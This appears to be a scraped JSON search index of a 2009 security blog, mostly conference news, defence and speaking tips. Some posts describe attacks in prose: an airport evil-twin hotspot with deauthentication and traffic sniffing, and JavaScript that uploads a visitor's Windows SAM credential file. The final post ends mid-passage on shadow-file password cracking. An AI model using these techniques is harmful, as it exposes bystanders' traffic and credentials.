all these things as well as ACL manipulation (deny any/any is a great place to start, then build upon what you **need** to allow **out** and **in**). Know how to manually reset passwords in Cisco switches, routers, pix, and Linux machines (single user mode). 5. **Monitoring**: General administration and monitoring is the main focus for this one. As soon as there is any sign of compromise, they inform the Incident Responder and continue to monitor the other systems. This person needs as much visual real-estate as possible they need to have all kinds of monitoring (process, network and services) tools up and running. Also, they need to be scanning the network constantly (AutoScan's Intrusion Alert is your friend) for any 'new' IP addresses that show up. Watch for ARP spoofing (google: DecaffeinatID) Have a password policy: Do not use the same password on all of your systems. A lot of teams do this for speed and team dynamics but you can keep both if you circulate that password policy around your team and it is well known. For example. Your active directory domain controllers could have an admin password of “$tupid Active Directory Pa$$word”, changing only the middle part of the pass ph","date":"2009-02-20","objectID":"https://malicious.link/posts/2009/2009-02-20-winning-hacker-competitions-as-defenders/:1:0","tags":null,"title":"Winning Hacker Competitions as Defenders","uri":"https://malicious.link/posts/2009/2009-02-20-winning-hacker-competitions-as-defenders/"},{"categories":["ccdc","competition"],"content":"Execution Phase: Do what you planned, and stick to it. Plan for Armageddon and hope for cake. Once you have done all of the basics that you can plan for, then all you have to worry about are your public facing services (Web, FTP etc.) Web Applications: These are on the for-front of today’s security watch list. The reason? Because they HAVE to be accessible. How do you fight / protect it? Log review. Now in an actual live site, it would be difficult to impossible to really watch logs effectively. However in the dynamic sites these days where files on the server don’t change, just the database, it would behoove you to put something like tripwire (linux or windows) to watch the files in the web directory for changes. If a file gets added to that directory you know that it needs to be investigated. Don’t stop the investigation at deleting the file either, look through the logs, find out how it got there and close up the hole. FTP: Set up your FTP server to log attempts to login. Open the logs with tail -f (linux) or BareTail (windows) and watch it. If you see someone trying to brute-force login or someone logging in that shouldn’t be, start investigating. Other: It basically falls back to the basics with all services. Watch the logs for anomalies. That’s really it folks. Have you been on either side? Comment and let others know how they can better prepare. ","date":"2009-02-20","objectID":"https://malicious.link/posts/2009/2009-02-20-winning-hacker-competitions-as-defenders/:2:0","tags":null,"title":"Winning Hacker Competitions as Defenders","uri":"https://malicious.link/posts/2009/2009-02-20-winning-hacker-competitions-as-defenders/"},{"categories":["rant"],"content":"So here is the deal. I have a ticket to the RSA Conference that is April 20-24 in San Francisco, at Moscone Center. I can’t use it. So I am offering it up as a bribe. Here is the bribe. I need a video of The Middler in action. From start (downloading) to finish (compromise / root / BeEF / owange) of another machine. The video must be without audio, pausing a bit with each step, and a maximum of 1020 x 720 in resolution preferably in Camtasia Studio format. And no, Jay, it can’t be the one you used at ShmooCon. This video will be added to The Academy Pro site through the normal cycle. Submit your videos via link, or attachment to _rob [at] theacademy d0t ca or twitter @mubix _ If you are a vendor / conference organizer and would like to offer the same deal for whatever kind of video you would like (as long as it fits the M.O. of The Academy Pro / Home) please contact me at rob [at] theacademy d0t ca. Direct Link to The Middler download: http://inguardians.com/tools/middler-alpha.tgz ","date":"2009-02-16","objectID":"https://malicious.link/posts/2009/2009-02-16-bribing-the-security-community/:0:0","tags":null,"title":"Bribing the Security Community","uri":"https://malicious.link/posts/2009/2009-02-16-bribing-the-security-community/"},{"categories":["internet"],"content":"I got this off of a post by Jason Appelbaum and I thought it important to repost. We all need to remember where we came from once in a while. History of the Internet from Melih Bilgil on Vimeo. ","date":"2009-02-13","objectID":"https://malicious.link/posts/2009/2009-02-13-the-history-of-the-internet-video/:0:0","tags":null,"title":"The History of the Internet - VIDEO","uri":"https://malicious.link/posts/2009/2009-02-13-the-history-of-the-internet-video/"},{"categories":["shmoocon","tools"],"content":"It figures that someone who didn’t go actually made a list of tools. (Probably because they didn’t have to suffer the ShmooFlu) Check out: http://blog.security4all.be/2009/02/shmoocon-2009-overview-collection-of.html Thanks to Security4all for posting it up! If you see something that he doesn’t have, pictures, videos, links, or tools, please let him know. FireTalks / PodCasters Meetup audio can be found here soon: http://pcm.libsyn.com/ ","date":"2009-02-12","objectID":"https://malicious.link/posts/2009/2009-02-12-shmoocon-tools/:0:0","tags":null,"title":"ShmooCon Tools","uri":"https://malicious.link/posts/2009/2009-02-12-shmoocon-tools/"},{"categories":["cons","shmoocon","tools"],"content":"The official link is up and here it is.. well, until they release the beta: http://inguardians.com/tools/middler-alpha.tgz Keep up with http://www.inguardians.com/ for all of their great tools. ","date":"2009-02-07","objectID":"https://malicious.link/posts/2009/2009-02-07-the-middler-gets-released-at-shmoocon/:0:0","tags":null,"title":"The Middler gets released at ShmooCon!","uri":"https://malicious.link/posts/2009/2009-02-07-the-middler-gets-released-at-shmoocon/"},{"categories":["metasploit","internet"],"content":"Metasploit is awesome, but some don’t know that their are updates all the time via SVN, and even fewer know of places to get good non-svn modules / scripts. Here are a few of my favorites: https://www.securinfos.info/metasploit/msfxdc.php http://metasploit.com/users/mc/ http://darkoperator.blogspot.com – newly added, check out the CookieMonster script and a host of others: http://pentest.cryptocity.net And of course: http://carnal0wnage.blogspot.com/ ","date":"2009-02-04","objectID":"https://malicious.link/posts/2009/2009-02-04-metasploit-across-the-net/:0:0","tags":null,"title":"Metasploit Across the Net","uri":"https://malicious.link/posts/2009/2009-02-04-metasploit-across-the-net/"},{"categories":["robin wood","tools","egress"],"content":"I have had the idea for this app for a long time, expressed it a few times, but never really pushed, and I sure that I am not the only one who has thought of or wanted an app like Ear Trumpet by Robin Wood. Well on Jan 21st Sam Buhlig posted to the PaulDotCom mailing list asking for an app to test a firewall that would answer on all ports. A great discussion spawned off and a couple guys (Dimitrios Kapsalis, and Robin Wood) started work on it. So what is Ear Trumpet? It’s a server/client app just like Cain and Abel is. But each piece has one very simple task: ear listens on a server on all TCP port, and trumpet tries to get to it on all TCP ports. That’s it. What does that do for me? Well, here are two instances where it could be useful: As a Firewall / Perimeter Technician, where you use it to test to see if all of your firewall rules are working properly so that no one can get through. (Outside in. Ear internal, Trumpet external) As a Penetration Tester, where you use it to find exfiltration points, ways out of the network. (Inside out, Ear external, Trumpet internal), You could even put Trumpet on multiple computers in this instance and see which systems have different access out. There are sleep methods plugged into Trumpet to allow you to stay under the radar. What can you use it for? Simple programs like this always have a million uses. Comment with your idea. ","date":"2009-02-03","objectID":"https://malicious.link/posts/2009/2009-02-03-ear-trumpet/:0:0","tags":null,"title":"Ear Trumpet","uri":"https://malicious.link/posts/2009/2009-02-03-ear-trumpet/"},{"categories":["internet"],"content":"I registered Bobstories.com after listening to PaulDotCom for a while. I have always told stories of this manor, but never quite put a name to “my friend”. Now that he has a name, it is only fitting that he has a domain and a blog. Please, come, register under the name bob_#### with a mailinator address to match, or your own name and email address if you wish. I’ll moderate all posts simply for spam purposes and have them up post haste. So to start things off, here is my Bob story: Bob and I were hanging out at an airport waiting for our flights. He was headed to Kenya and I to Canada. Being the evil guy that Bob is, he wipped out his DD-WRT Fonera router, hooked it up to his laptop, turned on internet sharing and shared out his teathered internetconnection to his ethernet port and connected the other end to his Fon. He then proceeded to boot up his BT3 VM and attach his USB Alfa to it. Connecting to the WPA AP portion of his Fon he configured the other virtual wireless interface for “Free Public Wireless” and pulled a DHCP address from his laptop for the WAN port. Disconnecting the Alfa he proceeded to start using it to mass deauth the other APs in the area. Leaving that to go he spun up dsniff, wifizoo, cain and able, and ettercap listening on the ‘vmware briged ethernet’. And of course being the ethical person that I am, I proceeded to pressure Bob until he finally dumped the logs right before his flight left. We parted ways and I haven’t seen him since. Is Bob in your city/town/country register on Bobstories.com and tell us what evil thing he did today. ","date":"2009-02-02","objectID":"https://malicious.link/posts/2009/2009-02-02-bob-stories-airport-boredom/:0:0","tags":null,"title":"Bob Stories - Airport Boredom","uri":"https://malicious.link/posts/2009/2009-02-02-bob-stories-airport-boredom/"},{"categories":["certifications"],"content":"I recently obtained the status Offensive Security Certified Professional. It is one of the best courses I have ever taken. It challenged me to think and learn new skills on the fly. You start the course with a bunch of video files, a huge pdf and an lzm file to get your VPN setup. It is self paced and intense. The topics cover everything from Back|Track basics to the HXDEF rootkit. Here is the problem, you can’t get a job with it. I know that seems shallow, but let me explain. As I see it there are basically 3 types of certifications or for that matter education in general that you can go through. The first gets you a job. The second teaches you something. The third is good for you or fun.This course is fun but more so falls in the ’teaches you something’ category. The CISSP on the other hand help you get a job, but I’ll hold that topic for another post. Well, the Offensive Security 101 course (leads to the OSCP test), is not quite on the radars of any recruiters or for that matter companies yet. Which is truly a shame. Unlike the CISSP and almost every other certification that I know of or heard of via 3rd party, this cert makes you “try harder”. And all of the pain ends in a 24 hour marathon of hacking, where you will be an idiot not to use every second of it. I have been a huge supporter of Back|Track for ages and they have really shifted my thinking of certifications by providing the Offsec 101 course. I can’t wait to take their other courses, Wi-Fu and Back|Track to the Max (which I am told that my mind will melt during the course of study). They also have some instructor led training so you can get one on one with Muts or one of the other crazy brains behind OFFENSIVE SECURITY. You can sign up for classes via their website: http://offensive-security.com/training.php Also check out some of their videos here: http://offensive-security.com/videos.php **Update: **Back|Track to the Max is now named: Cracking the Perimeter which ends in your OSCE (Offensive Security Certified Expert) exam. ","date":"2009-02-01","objectID":"https://malicious.link/posts/2009/2009-02-01-offensive-security-certified-professional/:0:0","tags":null,"title":"Offensive Security Certified Professional","uri":"https://malicious.link/posts/2009/2009-02-01-offensive-security-certified-professional/"},{"categories":["ideas"],"content":"First: Using SAMBA to crack Unix passwords Theory: You compromise a unix host during a pentest and grab /etc/shadow and /etc/password. You take the entries for root in both and drop them into a unix host that you control that is set up with SAMBA to sync authentication. You then use windows methods to extract the LM/NTLM hash from SAMBA. Problem: SAMBA doesn’t cache the LM/NTLM hash until the correct one is passed to it. I’m still not sure how SAMBA uses the *nix hashes so there still may be a vulnerability there, but I don’t think there is any research there yet. And I don’t have the cryptographic mind to figure it out. Second: Random Thoughts - Web App Hacking Theory: Prepopulating a hidden upload field through SQLi or other methods of altering a site Problem: The DOM does not allow this to happen, however, I don’t think that that rules out flash or VB script that I know of. Please comment and correct me if I am wrong. ","date":"2009-01-31","objectID":"https://malicious.link/posts/2009/2009-01-31-retractions-web-app-and-samba/:0:0","tags":null,"title":"Retractions - Web App and SAMBA","uri":"https://malicious.link/posts/2009/2009-01-31-retractions-web-app-and-samba/"},{"categories":["internet"],"content":"The Full Disclosure mailing list has a long and illustrious past. It has played host to everything from zero days to politics. One thing that has rung true for a number of years, if not since it’s inception is that it is unregulated (save spam of course). However in recent months it has fallen pray to less and less technical discussions, and more bickering, name calling, and outright trolling. The reason for this post is to let everyone know that has unsubscribed, that a change is coming. A bit of “Spring cleaning” of sorts. Please see the following FD post to see the dirt: Post 960 - 2009 So get back on, the wild west has been cleared. Sign up here: https://lists.grok.org.uk/mailman/listinfo/full-disclosure ","date":"2009-01-30","objectID":"https://malicious.link/posts/2009/2009-01-30-full-disclosure-gets-dusted-off/:0:0","tags":null,"title":"Full Disclosure gets dusted off","uri":"https://malicious.link/posts/2009/2009-01-30-full-disclosure-gets-dusted-off/"},{"categories":["internet","tivo","rant"],"content":"TiVo and DVRs in general have brought TV watching a long way. Some of the innovations that have come of it have made the TV experience better. Commercial skipping is my own personal favorite. But some of the other features are pausing, rewinding, and fast forwarding (after you are behind a bit obviously) and finally recording. Now, recording live TV is nothing new. People have done it since VCRs were invented, and I’m sure much before then. But the problem, from back in the day, all the way up to the most updated TiVo is that you, the user have to remember to set it up to record, and if you missed an episode, you’re SOL. In comes torrenting. Usually it’s a bad word on the Internet and on the news, so I will make my disclaimer here. I am not a lawyer, nor do I know the laws surrounding what I am about to describe. Use at your own discretion. Using your favorite torrent search engine (mine is http://www.scrapetorrent.com/) you can find every episode of every show you could ever imagine, even some of the more obscure ones. However we run into the same problem, you the user have to know when a new episode is out, hunt it down, and download it. This is where TVRss (http://www.tvrss.net/) shines and makes your life easy. TVRss is a website that serves up RSS feeds for a huge list of shows. You might not find some of the more obscure shows, like you would doing a naked torrent search, but they have most of them. So where do all the pieces fit together? TVRss + uTorrent (or your favorite RSS supporting torrenting program) + your favorite media server/client of choice and you have a free TiVo killer. Lifehacker has a tutorial on getting this running working with Democracy: http://lifehacker.com/204057/ I will post screen shot here later ","date":"2009-01-22","objectID":"https://malicious.link/posts/2009/2009-01-22-tivo-for-the-economically-unstimulated/:0:0","tags":null,"title":"TiVo for the Economically Unstimulated","uri":"https://malicious.link/posts/2009/2009-01-22-tivo-for-the-economically-unstimulated/"},{"categories":["podcasting","shmoocon","cons"],"content":"More information can be found at http://www.podcastersmeetup.com/ But here is the down and dirty: We are sponsored this year by: HP, SunbeltSoftware, DojoSec, and TheAcademyPro / TheAcademyHome solidly so far. The following podcasts will be making an appearance: Hak5 PaulDotCom CyberSpeak Securabit SploitCast Unpersons Phone Losers of America SMBMinute And the schedule goes as such: 1700 - 1800 - Meet and greet, and setup (Everyone involved in the live event please show up as close to this start time as possible) 1800 - 1900 - Live Show (This will probably go over time) 1900 - 1930 - Book signing and transition time 1930 - 2030 - FireTalks (more below) 2030 - 0400 - Food and Drinks on us at local spot. ( We are fielding a couple options right now, but nothing locked down yet. Plus a new event: FireTalks. Check out the site for more details. ","date":"2009-01-21","objectID":"https://malicious.link/posts/2009/2009-01-21-podcasters-meetup-at-shmoocon/:0:0","tags":null,"title":"Podcasters Meetup at ShmooCon","uri":"https://malicious.link/posts/2009/2009-01-21-podcasters-meetup-at-shmoocon/"},{"categories":["shmoocon","cons","postcasters meetup"],"content":"Sponsors: We have had a lot of great response for everyone on this year’s event! I want to reiterate, this event is for podcasters, bloggers, twitter addicts, and everyone in between. I would also like to announce an update to our sponsor’s lineup: TheAcademyPro.com / TheAcademyHome.com These are twin sites catering videos to the security pro looking to learn about everything from enterprise gear to Maltego, and the home user trying to start the learning about security and how to secure their own computers without going to you the IT guy in the family. DojoSec A conference in Columbia, Maryland that is geared towards education of the beginner to intermediate hacker / security guru. It is a monthly conference with perpetual call-for-papers. Hewlett-Packard No introduction needed, they are the maker of the fabled HP 2133, the hackers choice ’netbook’ (which we may just be giving away one) Sunbelt Software Makers of VIPRE the low resource AV, and the CWSandbox malware analyzer. Trusted Signal Trusted Signal is a vendor independent provider of information security solutions, expert services and training. Look forward to some awesome prizes and giveaways this year! ","date":"2009-01-20","objectID":"https://malicious.link/posts/2009/2009-01-20-podcasters-meetup-at-shmoocon-update-1/:1:0","tags":null,"title":"Podcaster's Meetup @ ShmooCon Update 1","uri":"https://malicious.link/posts/2009/2009-01-20-podcasters-meetup-at-shmoocon-update-1/"},{"categories":["shmoocon","cons","postcasters meetup"],"content":"The Lineup: The podcasts that we have heard back from as attending: Hak5 PaulDotCom CyberSpeak Securabit Security Justice SploitCast Unpersons Phone Losers of America SMBMinute ","date":"2009-01-20","objectID":"https://malicious.link/posts/2009/2009-01-20-podcasters-meetup-at-shmoocon-update-1/:2:0","tags":null,"title":"Podcaster's Meetup @ ShmooCon Update 1","uri":"https://malicious.link/posts/2009/2009-01-20-podcasters-meetup-at-shmoocon-update-1/"},{"categories":["shmoocon","cons","postcasters meetup"],"content":"The Schedule: (Until the ShmooCon’s solid schedule is posted this is floating): FRIDAY NIGHT 1700 - 1800 - Meet and greet, and setup (Everyone involved in the live event please show up as close to this start time as possible) 1800 - 1900 - Live Show (This will probably go over time) 1900 - 1930 - Book signing and transition time 1930 - 2030 - FireTalks (more below) 2030 - 0400 - Food and Drinks on us at local spot. ( We are fielding a couple options right now, but nothing locked down yet. ","date":"2009-01-20","objectID":"https://malicious.link/posts/2009/2009-01-20-podcasters-meetup-at-shmoocon-update-1/:3:0","tags":null,"title":"Podcaster's Meetup @ ShmooCon Update 1","uri":"https://malicious.link/posts/2009/2009-01-20-podcasters-meetup-at-shmoocon-update-1/"},{"categories":["shmoocon","cons","postcasters meetup"],"content":"FireTalks: Have a talk that didn't get accepted? Want the chance to share a project that you are working on? Think of FireTalks as a verbal blog post. The human experience is built on the ability to tell and learn from stories. At SchmooCon 2009, “FireTalks” is a supportive environment in which to either share insights or learn from others. Whether polishing a presentation (story) for conferences, meetings or training, FireTalks are the way to share, learn and improve. The inaugural FireTalks take place Friday night -- following the Podcasters Meetup. Talks are limited to 10-15 minutes with four (4) scheduled talks and four (4) open slots. Open slots will be filled on a first come, first serve basis. Saturday night will be more relaxed. Come join us and present, listen and learn. When Friday and Saturday Night at ShmooCon ‘09 Where ShmooCon 2009, in or around the press room The list of prizes will be posted as they materialize. Keep up with http://www.podcastersmeetup.com/ for the details. If you have any questions at all, please feel free to shoot me an email. Look forward to seeing ya’ll at the Wardman Park - Feb 6-8 ","date":"2009-01-20","objectID":"https://malicious.link/posts/2009/2009-01-20-podcasters-meetup-at-shmoocon-update-1/:4:0","tags":null,"title":"Podcaster's Meetup @ ShmooCon Update 1","uri":"https://malicious.link/posts/2009/2009-01-20-podcasters-meetup-at-shmoocon-update-1/"},{"categories":["tools","maltego"],"content":"Table of Contents: Part 1 - Introduction Part 2 - Entities and Transforms Part 3 - The Human Factor Part 4 - Server Time (CTAS, PTTAS, MALTAS, SQLTAS, SNTAS) Part 5 - Hacks, Tips, and Tricks Today we are taking a brief step outside of Maltego and at the end we’ll show how you can use what you have learned to take Maltego to another level. So, without further ado: The Human Factor is why we all still have jobs in the security world. It is impossible for machines at this day in age to make logical leaps of faith. Yes, there is fuzzy logic, but the human brain still trumps computers on being able to instinctively make those leaps. Instinct, that word describes the whole reason for this part in the series. Just as a PI uses he gut to lead him on the right trail, as an OSINT (Open Source Intelligence) Specialist you have to use your instincts to guide your investigation as well. The following paragraphs will describe my own method of making those leaps. If you disagree or have better methods, please comment below so that others can learn as well. What is a logical leap of faith? Well, most pentesters do it daily if not hourly, when they assume a cracked password is going to work in other places. It’s all about betting on standards. Standards in this reference is anything that has become common place, not specifically a written rule, but those are good to. Dan Geer ‘left’ @Stake when he and other thought leaders in the security community published a paper back in 2003: Cyber _In_Security: The Cost of Monopoly [PDF] Archived Link: http://pdf.textfiles.com/academics/cyberinsecurity.pdf I was originally planning on making this article full of examples on how you can make these leaps, but I have had a lot of time to think these examples and have decided against it. To practice this method you must use your own experiences. Where do people do the same thing? Think about it. I’m sure you can come up this at least a dozen examples where even you do the same thing across the board… Ok, so I can’t resist. Using the same password, or username on different sites. Seeing a User Agent that is concatenated by a proxy. The router being .1 or .2. Using full class C networks. Always adding the same core friends or co-workers to every social networking site. What about referencing the same ‘ficticous’ bank when describing a problem with that bank. What examples have you come up with? How do you pull this out-of-the-box thinking into Maltego? When entering an email for an entity, try putting it in under different domains (yahoo.com, aol.com, gmail.com, google.com, hotmail.com). When entering a domain, try putting it in under different TLDs (.net, .org, .tv). You might be surprised at the gems you find when you find those forgotten pieces of information. This all falls back on my mantra that you should put in ALL of the information you have (and estimated) before you even start running transforms. Maltego is a tool that can only take you so far. Your creativity is what makes a tool like this powerful. ","date":"2009-01-13","objectID":"https://malicious.link/posts/2009/2009-01-13-maltego-2-and-beyond-part-3/:1:0","tags":null,"title":"Maltego 2 and beyond - Part 3","uri":"https://malicious.link/posts/2009/2009-01-13-maltego-2-and-beyond-part-3/"},{"categories":["rant","thoughts"],"content":" SQLi through meta refreshes using cookies or useragents. Making SQLi a client-side attack. How much do you want to bet that the person that visits the site the most is the administrator :) Javascript adding hidden files upload form fields that are auto populated with C:\\Windows\\System32\\config\\SAM or C:\\Windows\\Repair .. yadada. You get the idea. ","date":"2009-01-07","objectID":"https://malicious.link/posts/2009/2009-01-07-random-thoughts-web-app-hacking/:0:0","tags":null,"title":"Random Thoughts - Web App Hacking","uri":"https://malicious.link/posts/2009/2009-01-07-random-thoughts-web-app-hacking/"},{"categories":["speaking","presentations","rant"],"content":" Today I was in a brief / talk / meeting and I just wanted to share with you some of the things that I saw in this event that might better help you know what NOT to do while getting up in front of any size crowd. Death by bullets (Yes this is bulleted to be ironic). But seriously, this was a reoccuring theme throughout the meeting. Try and keep it to 3 or 5. *Simple = Better The slides should not be more important than the speaker. If your slides can be printed out and disbursed. Don’t waste the time of everyone attending by reading them or having us read them. If the audience takes more than 5 seconds to read a slide = FAIL If the speaker takes more than 2 seconds to read a slide = FAIL (this is only tolerable at the 2 second limit during long and information intense talks) If your text during slide creation is AUTOSIZING DOWN, you are in the process of FAIL Visio is a hand out development tool. Using it as a slide development tool = FAIL Holding items in your hands without the items being on topic = FAIL (do not figit with a book, or a pen or an award until it is time to use said object) Interrupting you co-speaker to enhance points = FAIL (this is _**NEVER **_a good thing) You are demeaning your co-speakers presence. Making it obvious that you were not paying attention to your co-speaker by stating that you don’t know something that was actually just presented by your co-speaker = MAJOR FAIL I just wanted to get these off my chest as the speakers were not interested in input. I hope these help you become a better speaker. ","date":"2009-01-06","objectID":"https://malicious.link/posts/2009/2009-01-06-speaking-102-the-audience-perspective/:0:0","tags":null,"title":"Speaking 102 - The Audience Perspective","uri":"https://malicious.link/posts/2009/2009-01-06-speaking-102-the-audience-perspective/"},{"categories":["presentations","speaking"],"content":"I believe there is a fear in the security community about speaking. Most don’t believe they either have something important enough to say, or have some awesome ‘thing’ and are just too afraid of the stage. Here are some resources and videos that have helped me gain the confidence to speak. ","date":"2008-12-26","objectID":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/:0:0","tags":null,"title":"Speaking Evolved","uri":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/"},{"categories":["presentations","speaking"],"content":"Gary Vaynerchuck @ Web 2.0 Expo: **http://www.youtube.com/watch?v=EhqZ0RU95d4 – Specifically look at how he speaks. How he starts, how he finishes. Does he have slides? ","date":"2008-12-26","objectID":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/:1:0","tags":null,"title":"Speaking Evolved","uri":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/"},{"categories":["presentations","speaking"],"content":"Merlin Mann @ Google: **http://www.youtube.com/watch?v=uOgHE5nEq04 – Look at his slides, how does he flow through them? Moving from point to point continuously without stopping for the slide change. How does he get the people present to interact with the presentation. Those are two dynamic (hate that word), and powerful speakers who know how to make IT (not eye-tee) interesting no matter what IT is. Ok what about slides, well, basically SlideShare is the YouTube for presenters. You can post your slides, get them reviewed by some of the best in the biz, browse and see how the pros do it, etc.. ","date":"2008-12-26","objectID":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/:2:0","tags":null,"title":"Speaking Evolved","uri":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/"},{"categories":["presentations","speaking"],"content":"Slide Share - http://www.slideshare.com Here are some select slides that have made a difference in my presentation style: Death By Power Point from Luis Saga Better Presentations from tomdolly Also, Garr Reynolds, one of the masters of presenting can be found at http://www.presentationzen.com/. You can find him on SlideShare at http://www.slideshare.net/garr/ . One I couldn’t recover was here: Dead Link - http://www.slideshare.net/fabiancrabus/presentationzen ","date":"2008-12-26","objectID":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/:3:0","tags":null,"title":"Speaking Evolved","uri":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/"},{"categories":["presentations","speaking"],"content":"Security Catalyst Comments from some of the Security Catalyst members (Used with permission): Are you a member? Want to be? Here is the link to the thread: http://www.securitycatalyst.org/forums/index.php?topic=1013.0 ","date":"2008-12-26","objectID":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/:4:0","tags":null,"title":"Speaking Evolved","uri":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/"},{"categories":["presentations","speaking"],"content":"Andrew Hay - http://www.andrewhay.ca/ writes: Great post Rob. I know quite a few people who list “public speaking” as their biggest fear. The only way to overcome that fear is to keep doing it and recording “webinars” (I hate that word) is a great way to get over those jitters. ","date":"2008-12-26","objectID":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/:5:0","tags":null,"title":"Speaking Evolved","uri":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/"},{"categories":["presentations","speaking"],"content":"Dave Hull from - http://trustedsignal.com/ writes: Rob thanks for starting the thread. I’ve been working to increase my face time with groups over the last year plus. I don’t consider myself an extrovert, but do enjoy presenting. I’ve been studying presentation and teaching styles for the last few years – http://www.presentationzen.com/ is a great site. All the presentations I’ve seen at http://www.ted.com are quite good. I recently attended a pretty bad presentation. The slides were typical PPT – title, too many bullets with too many words after each bullet. The presenter never moved, was factually wrong on several counts and when he tried to get the audience to participate he flat out insulted one person who mispronounced Ethereal. It was awful, but I learned more about what not to do. I’d like to start submitting talks to conferences. My problem is a form of writer’s block – what to talk about. But I know from having attended numerous talks where I didn’t learn anything new, that having a brilliant new idea is not a prerequisite to giving a talk. There’s always going to be folks in the audience who know more and less than you do. I was fortunate to be invited to speak at my local ISSA and HTCIA chapter meetings this month. It was a last minute invitation due to cancellations of previously scheduled speakers. Both groups needed to hear back right away and when I asked my employer about it, I was told I would have to get the approval of the Ethics Committee. Since that process was going to take some time, I had to decline the invitations. However, I did finally get standing approval for future engagements. Lesson learned, make sure you check with your employer and get your ducks in a row. I recently checked out the Stand And Deliver audiobook from my local library. It’s not revolutionary, but it’s worth a listen/read for anyone who is interested in public speaking. Thanks again for the links and the thread. ","date":"2008-12-26","objectID":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/:6:0","tags":null,"title":"Speaking Evolved","uri":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/"},{"categories":["presentations","speaking"],"content":"Security4all - http://security4all.blogspot.com/ writes: A favorite topic of mine. Don’t forget the excellent blog Slide:ology from Nancy Duarte who worked on the book with Gar and now has her own book. http://slideology.com/ I have yet to buy and read her book myself (due to lack of time). You might also want to have a look at my own blog for some pointers here and there. I still have a lot to learn and practice but you might find some useful info in there: http://blog.security4all.be/search/label/presentations Also, have a look at my Slideshare favorites. Sometimes because of the slides, sometimes because of the topic http://www.slideshare.net/security4all/favorites ","date":"2008-12-26","objectID":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/:7:0","tags":null,"title":"Speaking Evolved","uri":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/"},{"categories":["presentations","speaking"],"content":"Wim Remes - http://domdingelom.blogspot.com/ writes: Ain’t that the truth. I am an introvert, no doubt about that. If there is one thing that helps to get over ‘the fear’, it’s dry-runs, and lots of them. There’s no substitute for training your public speaking skills in front of an audience of people that you know and trust. People that you know will be honest with you and push you forward. I think most of the sites have already been mentioned PZ, Slideology, TED, Google Video (Authors@google are good sometimes too), Youtube, at this moment I can’t think of any other. ","date":"2008-12-26","objectID":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/:8:0","tags":null,"title":"Speaking Evolved","uri":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/"},{"categories":["presentations","speaking"],"content":"Didier Stevens - https://didierstevens.com/ writes: Most don’t believe they either have something important enough to say I believe this idea is also enforced because of the extra media attention one type of IT security speakers get: “The Sky Is Falling” speakers. It’s not because you’ve not broken something, or you have no prediction of impending doom, that you’ve nothing valuable to say. To the contrary. Another hint to help you overcome your fear of speaking in public, is to start with a subject you’re passionate about (or at least interested). Your passion/subject-expertise will help you gain confidence. Analyze your fear of speaking in public. Try to identify which particular aspects of speaking in public cause you to fear it. Are you afraid to draw a blank? get audience questions? look unprepared? speak to ranking officers? speak to a large public? … If you can identify precisely what worries you, you can start to work on that specific point to gain confidence. Example: afraid to draw a blank? Rehearse! Use notes, bullet points, mindmaps, … ","date":"2008-12-26","objectID":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/:9:0","tags":null,"title":"Speaking Evolved","uri":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/"},{"categories":["presentations","speaking"],"content":"Kevin Riggins - http://infosecramblings.wordpress.com/ writes: The suggestions and resources offered so far on this thread are excellent. I would like to add Toastmasters. I believe it is one of the best venues available for developing your speaking skills. As alluded to previously, several studies have shown that the most common fear people have is speaking in public. Toastmasters helps overcome this fear or at least be able to perform in spite of it in the following ways: Speaking often - you have the opportunity to speak frequently. As the saying goes, practice makes perfect. Trusted audience - the people you are speaking to are supportive and understand exactly what you are dealing with. Constructive feedback - your audience is expected and in essence required to provide you with feedback. However, it is not rah rah session. I have gotten many helpful tips. Plus there is a designated evaluator for each of your speeches with very focused feedback. Great materials - the training materials are great for helping you learn how to develop good speeches and how to deliver them effectively. Toastmasters is an international organization, so you can find clubs all over the world. ","date":"2008-12-26","objectID":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/:10:0","tags":null,"title":"Speaking Evolved","uri":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/"},{"categories":["presentations","speaking"],"content":"Ron Woerner writes: How ironic. (ISC)2 has an article in their winter magazine on speaking: (https://www.isc2.org/uploadedFiles/%28ISC%292_Member_Content/Member_Resources/infosecmag-winter2008.pdf). It’s cool to see the message is getting across. Although, it’s like golf; the only way to get better is to (a) practice and (b) get qualified feedback. You can read all you want about it, but that won’t make you a good presenter. Get out there and do it. Then ask a trusted friend what you can do better. (Of course, Toastmasters provides this) Anyways, I hope this helps. From pro to n00b, the day we stop improving is the day we start dying, As for not having anything good to say, stop fooling yourself. Rob http://www.slideshare.net/mubix/ – No posted slides yet, mine will be in que for http://informer.ihackstuff.com/ – Johnny Long’s brilliant idea for raising money for charity by having people release to people early based on subscriptions, all proceeds go to children in need. ","date":"2008-12-26","objectID":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/:11:0","tags":null,"title":"Speaking Evolved","uri":"https://malicious.link/posts/2008/2008-12-26-speaking-evolved/"},{"categories":["thoughts"],"content":"This is an untested theory, but I don’t see why it wouldn’t work. Anyone who wants to prove it either way is very welcome to comment on the matter below. Ok. Say you have the following exerpt from an /etc/shadow file: root:awac7eQv2CT0g:12685:0:10000:::: billybob:$7$b1XHzqR5$RJxOyHRAix2rVmtXyHkLikmnod.z94P6vSL1h8ZeUdY/urvOvkvJjg2hn/J0r90YAdAA8HedGIPR2D7.zIzJS0:14438:0:99999:7::: Both passwords in clear text are “uncrackable”. Here is where the trick comes into it. We use the weakness in LM hashes to crack the password (as long as it’s under 15 characters of course). We do this by slamming the password into our system, installing SAMBA, and telling it to 